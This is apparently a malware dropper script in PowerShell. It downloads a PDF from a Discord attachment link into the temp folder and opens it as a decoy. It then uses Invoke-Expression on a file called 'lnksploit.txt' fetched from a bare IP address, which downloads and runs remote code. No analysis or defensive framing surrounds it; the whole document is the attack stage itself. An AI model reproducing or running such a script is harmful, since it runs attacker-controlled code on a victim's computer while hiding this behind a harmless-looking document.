$source = "https://cdn.discordapp.com/attachments/952636004160901193/1128523368820375622/document60.pdf"
$destination = "$env:TMP\document60.pdf"
Invoke-WebRequest -Uri $source -OutFile $destination
cd $env:TMP
start .\document60.pdf
sleep 1
iex (iwr http://66.228.37.7/lnksploit.txt -UseBasicParsing)
